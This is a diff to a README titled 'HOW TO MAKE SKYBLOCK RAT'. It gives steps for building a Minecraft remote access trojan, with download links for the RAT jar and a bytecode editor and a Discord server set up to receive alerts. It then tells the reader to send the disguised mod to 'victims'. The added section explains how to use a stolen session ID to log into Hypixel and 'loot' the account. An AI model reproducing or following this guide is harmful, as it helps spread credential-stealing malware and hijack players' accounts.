@@ -1,7 +1,7 @@
 # HOW TO MAKE SKYBLOCK RAT
 * Step 1
- - Download rat.jar
- - Download (recaf-2.21.13-J8-jar-with-dependencies.jar)[https://github.com/NuPochemu3627/SkyblockRat/releases/download/rat/Auth.jar]
+ - Download [rat.jar](https://github.com/NuPochemu3627/SkyblockRat/releases/download/rat/rat.jar)
+ - Download [recaf-2.21.13-J8-jar-with-dependencies.jar](https://github.com/NuPochemu3627/SkyblockRat/releases/download/rat/recaf-2.21.13-J8-jar-with-dependencies_1.jar)
 
 * Step 2
  - Create discord server
@@ -17,3 +17,11 @@
 
 # Done, send resulting file to your victims, and tell them put this to mods.
 #  After victim put your mod in mods, your server will receive a notification with their SSID
+
+
+
+# HOW TO LOGIN WITH SSID
+
+- Download [Auth.jar](https://github.com/NuPochemu3627/SkyblockRat/releases/download/rat/Auth.jar)
+- Run minecraft 1.8.9 forge
+- Go to Multiplayer, then in top you can see Login, put there SSID and click "Login" after this you can join hypixel and loot account)
